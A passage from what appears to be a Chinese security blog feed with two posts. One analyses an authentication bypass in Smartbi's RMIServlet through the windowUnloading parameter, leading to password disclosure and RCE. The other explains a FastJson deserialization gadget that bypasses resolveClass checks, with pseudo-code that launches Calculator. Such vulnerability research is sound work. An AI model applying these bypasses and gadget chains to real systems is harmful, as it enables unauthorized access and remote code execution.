true));</span><br><span class="line">                        className = decode[0];</span><br><span class="line">                        methodName = decode[1];</span><br><span class="line">                        params = decode[2];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (className == null &amp;&amp; methodName == null) &#123;</span><br><span class="line">                    className = (String)request.getAttribute(&quot;className&quot;);</span><br><span class="line">                    methodName = (String)request.getAttribute(&quot;methodName&quot;);</span><br><span class="line">                    params = (String)request.getAttribute(&quot;params&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                info = new RMIInfo();</span><br><span class="line">                info.setClassName(className);</span><br><span class="line">                info.setMethodName(methodName);</span><br><span class="line">                info.setParams(params);</span><br><span class="line">                request.setAttribute(&quot;ATTR_KEY_RMIINFO&quot;, info);</span><br><span class="line">                return info;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当然还有些东西只能说，懂得都懂</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Smartbi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Smartbi逻辑漏洞</title>
      <link href="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浅析Smartbi逻辑漏洞"><a href="#浅析Smartbi逻辑漏洞" class="headerlink" title="浅析Smartbi逻辑漏洞"></a>浅析Smartbi逻辑漏洞</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>仅分享逻辑漏洞部分思路，全文以无害路由做演示，后续利用部分打码处理</p><p>厂商已发布补丁：<a href="https://www.smartbi.com.cn/patchinfo">https://www.smartbi.com.cn/patchinfo</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最近可以看到smartbi官网突然发布了新的补丁，对比学习了下</p><p>利用也仍然和RMIServlet相关，在这个Servlet上还有个Filter(smartbi.freequery.filter.CheckIsLoggedFilter)</p><p>如果我们访问调用一些未授权的类方法，就会返回如下字段</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705095525401.png" alt="image-20230705095525401"></p><p>我们先来看看如果正常情况程序该怎么走，首先如果调用RMIServlet，则会尝试获取到className与methodName，获取的方式也多种多样</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705095800089.png" alt="image-20230705095800089"></p><p>有通过解码windowUnloading参数获取</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705100021973.png" alt="image-20230705100021973"></p><p>有通过GET/POST获取</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705100158411.png" alt="image-20230705100158411"></p><p>甚至支持从请求体流中解析</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705100240104.png" alt="image-20230705100240104"></p><p>后面通过下面这两个判断对类与方法做鉴权，如果为true则会继续判断是否登录，未登录则抛出CLIENT_USER_NOT_LOGIN</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705100351950.png" alt="image-20230705100351950"></p><p>这里对于未授权右边部分我们可以不必关心，按照运算符优先级只要<code>FilterUtil.needToCheck</code>返回false那么整个结果一定为false，而<code>FilterUtil.needToCheck</code>中返回false的都是白名单，代表我们不需要登录都能访问，这也就是为什么上个版本通过利用<code>loginFromDB</code>登录默认内置用户</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705101505359.png" alt="image-20230705101505359"></p><p>接下来过了过滤器部分，我们在看RMIServlet如何取值，通过parseRMIInfo从request当中取得</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705101708783.png" alt="image-20230705101708783"></p><p>在这个方法中首先通过request.getParameter取值，若为空则通过multipart获取参数，如果都不行则通过request.getAttribute从之前保存的属性当中获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> RMIInfo <span class="title">parseRMIInfo</span><span class="params">(HttpServletRequest request, <span class="keyword">boolean</span> forceParse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;/vision/RMIServlet&quot;</span>.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            RMIInfo info = getRMIInfoFromRequest(request);</span><br><span class="line">            <span class="keyword">if</span> (info != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> info;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String className = request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">                String methodName = request.getParameter(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">                String params = request.getParameter(<span class="string">&quot;params&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != <span class="keyword">null</span> &amp;&amp; request.getContentType().startsWith(<span class="string">&quot;multipart/form-data;&quot;</span>)) &#123;</span><br><span class="line">                    DiskFileItemFactory dfif = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">                    ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(dfif);</span><br><span class="line">                    String encodeString = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        List&lt;FileItem&gt; fileItems = upload.parseRequest(request);</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;UPLOAD_FILE_ITEMS&quot;</span>, fileItems);</span><br><span class="line">                        Iterator var10 = fileItems.iterator();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span>(var10.hasNext()) &#123;</span><br><span class="line">                            FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">                            <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">                                String itemName = fileItem.getFieldName();</span><br><span class="line">                                String itemValue = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                                <span class="keyword">if</span> (<span class="string">&quot;className&quot;</span>.equals(itemName)) &#123;</span><br><span class="line">                                    className = itemValue;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;methodName&quot;</span>.equals(itemName)) &#123;</span><br><span class="line">                                    methodName = itemValue;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;params&quot;</span>.equals(itemName)) &#123;</span><br><span class="line">                                    params = itemValue;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;encode&quot;</span>.equals(itemName)) &#123;</span><br><span class="line">                                    encodeString = itemValue;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException | FileUploadException var14) &#123;</span><br><span class="line">                        LOG.error(var14.getMessage(), var14);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!StringUtil.isNullOrEmpty(encodeString)) &#123;</span><br><span class="line">                        String[] decode = (String[])((String[])CodeEntry.decode(encodeString, <span class="keyword">true</span>));</span><br><span class="line">                        className = decode[<span class="number">0</span>];</span><br><span class="line">                        methodName = decode[<span class="number">1</span>];</span><br><span class="line">                        params = decode[<span class="number">2</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (className == <span class="keyword">null</span> &amp;&amp; methodName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    className = (String)request.getAttribute(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">                    methodName = (String)request.getAttribute(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">                    params = (String)request.getAttribute(<span class="string">&quot;params&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                info = <span class="keyword">new</span> RMIInfo();</span><br><span class="line">                info.setClassName(className);</span><br><span class="line">                info.setMethodName(methodName);</span><br><span class="line">                info.setParams(params);</span><br><span class="line">                request.setAttribute(<span class="string">&quot;ATTR_KEY_RMIINFO&quot;</span>, info);</span><br><span class="line">                <span class="keyword">return</span> info;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这时候稍微对漏洞敏感的人已经意识到了一些问题</p><p>前面提到了有个windowUnloading参数，如果存在则会对值做解码，并将结果赋给className/methodName/params，</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705102704861.png" alt="image-20230705102704861"></p><p>那么我们是不是就能首先根据此对参数做污染，让其帮助我们通过FilterUtil.needToCheck的校验，之后等到了RMIServlet，又通过GET/POST/表单当中的值恢复真实调用</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705102814870.png" alt="image-20230705102814870"></p><p>关于构造windowUnloading，为了演示方便我选择else分支，因为这样返回的内容是明文，省去一次解码的问题</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705102953412.png" alt="image-20230705102953412"></p><p>当然选择上面这个if分支其实更好，这更方便我们使攻击流量更隐蔽，可以通过传入<code>jsonpCallback</code>参数去除解码，</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705103219188.png" alt="image-20230705103219188"></p><p>当然为了演示方便我还是选择else分支，任意选择FilterUtil.needToCheck当中的类方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">className=UserService&amp;methodName=checkVersion&amp;params=y4</span><br></pre></td></tr></table></figure><p>下面做演示，未使用windowUnloading前，调用受限方法会提示未登录(这里以无害方法做演示)</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705103836736.png" alt="image-20230705103836736"></p><p>使用后成功调用</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705103930047.png" alt="image-20230705103930047"></p><p>通过未授权调用，我们可以获取用户敏感信息包括密码</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705104148109.png" alt="image-20230705104148109"></p><p>通过上版本中提到的直接比对数据库方式登录</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705104321315.png" alt="image-20230705104321315"></p><p>最终可实现RCE，当然RCE也不止这一种</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705104529432.png" alt="image-20230705104529432"></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>上面提到可以配合RMICoder编解码使流量更隐蔽，同样以第一个无害方法getSystemId为例子</p><p><img src="/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20230705105227512.png" alt="image-20230705105227512"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Smartbi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJson与原生反序列化(二)</title>
      <link href="/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/"/>
      <url>/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="FastJson与原生反序列化-二"><a href="#FastJson与原生反序列化-二" class="headerlink" title="FastJson与原生反序列化(二)"></a>FastJson与原生反序列化(二)</h1><p>很早之前在发第一篇的时候@jsjcw师傅就曾提到1.2.49后也能利用引用绕过，后面由@1ue师傅在知识星球中利用这个思路成功绕过并分享了payload，至此fastjson全版本就彻底加入原生反序列化的gadget，向师傅们致敬，想着将文章完善的缘故，并且师傅们没有提到具体的原理，因此发个第二篇进行简单介绍。</p><p>当然这里不会详细说明完整的序列化与反序列化的过程，如果有感兴趣的可以参考panda师傅的博客，关于<a href="https://www.cnpanda.net/sec/893.html">序列化流程分析总结</a>与<a href="https://www.cnpanda.net/sec/928.html">反序列化流程分析总结</a>，里面已经写的很细致了。</p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>之前提到了从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法，</p><p><img src="/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426095410017.png" alt="image-20230426095410017"></p><p>在其<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,通过调用了<code>checkAutoType</code>方法做类的检查，这样真的是安全的么？</p><h2 id="resolveClass的调用"><a href="#resolveClass的调用" class="headerlink" title="resolveClass的调用"></a>resolveClass的调用</h2><p>乍一看，这样的写法很安全，当调用JSONArray/JSONObject的Object方法触发反序列化时，将这个反序列化过程委托给<code>SecureObjectInputStream</code>处理时，触发resolveClass实现对恶意类的拦截</p><p>这时候反序列化的调用过程是这样的，就是这样不安全的ObjectInputStream套个安全的SecureObjectInputStream导致了绕过</p><h3 id="不安全的反序列化过程"><a href="#不安全的反序列化过程" class="headerlink" title="不安全的反序列化过程"></a>不安全的反序列化过程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; <span class="function">readObject</span></span><br><span class="line"><span class="function"><span class="title">xxxxxx</span><span class="params">(省略中间过程)</span></span></span><br><span class="line"><span class="function">SecureObjectInputStream -&gt; readObject -&gt; resolveClass</span></span><br></pre></td></tr></table></figure><h3 id="安全的反序列化过程"><a href="#安全的反序列化过程" class="headerlink" title="安全的反序列化过程"></a>安全的反序列化过程</h3><p>多提一嘴，平时我们作防御则应该是生成一个继承ObjectInputStream的类并重写resolveClass(假定为TestInputStream)，由它来做反序列化的入口，这样才是安全的，因此压力再次给到了开发身上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TestInputStream -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure><p>为了解决这个问题，首先我们就需要看看什么情况下不会调用resolveClass，在<code>java.io.ObjectInputStream#readObject0</code>调用中，会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">                <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                    <span class="keyword">return</span> readNull();</span><br><span class="line">                <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                    <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                    <span class="keyword">return</span> readClass(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">                <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                    <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_STRING:</span><br><span class="line">                <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                    IOException ex = readFatalException();</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> WriteAbortedException(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                        bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(</span><br><span class="line">                            bin.currentBlockRemaining());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                            <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(<span class="keyword">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                            <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                        String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>再往后，跳过一些细节过程，上面的不同case中大部分类都会最终调用<code>readClassDesc</code>去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是<code>TC_CLASSDESC</code>那么就会在<code>readNonProxyDesc</code>中触发<code>resolveClass</code></p><p>再回到上面这个switch分支的代码，不会调用<code>readClassDesc</code>的分支有<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code>，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关，这一点可以从其描述看出</p><p><img src="/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426102949380.png" alt="image-20230426102949380"></p><p>那么就只剩下了reference引用类型了</p><h2 id="如何利用引用类型"><a href="#如何利用引用类型" class="headerlink" title="如何利用引用类型"></a>如何利用引用类型</h2><p>现在我们就要思考，如何在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查</p><p>答案是当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，这里以List为例，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">writeObjects(arrayList);</span><br></pre></td></tr></table></figure><p>当我们写入对象时，会在<code>handles</code>这个哈希表中建立从对象到引用的映射</p><p><img src="/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426105607843.png" alt="image-20230426105607843"></p><p>当再次写入同一对象时，在<code>handles</code>这个hash表中查到了映射</p><p><img src="/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426110435564.png" alt="image-20230426110435564"></p><p>那么就会通过<code>writeHandle</code>将重复对象以引用类型写入</p><p><img src="/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426110523137.png" alt="image-20230426110523137"></p><p>因此我们就可以利用这个思路构建攻击的payload了，这里简单以伪代码呈现，便于理解思路</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = TemplatesImplUtil.getEvilClass(<span class="string">&quot;open -na Calculator&quot;</span>);</span><br><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line"></span><br><span class="line">JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);</span><br><span class="line">arrayList.add(bd);</span><br><span class="line">  </span><br><span class="line">WriteObjects(arrayList);</span><br></pre></td></tr></table></figure><p>简单梳理下</p><p>序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在<code>handles</code>这个hash表中查到了映射，后续则会以引用形式输出</p><p>反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给<code>SecureObjectInputStream</code>，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过</p><p>当然前面也提到了不仅仅是List，Set与Map类型都能成功触发引用绕过。</p><h2 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h2><p>至此fastjson全版本实现了原生反序列化利用</p><p>代码测试依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.27.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试代码以HashMap为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 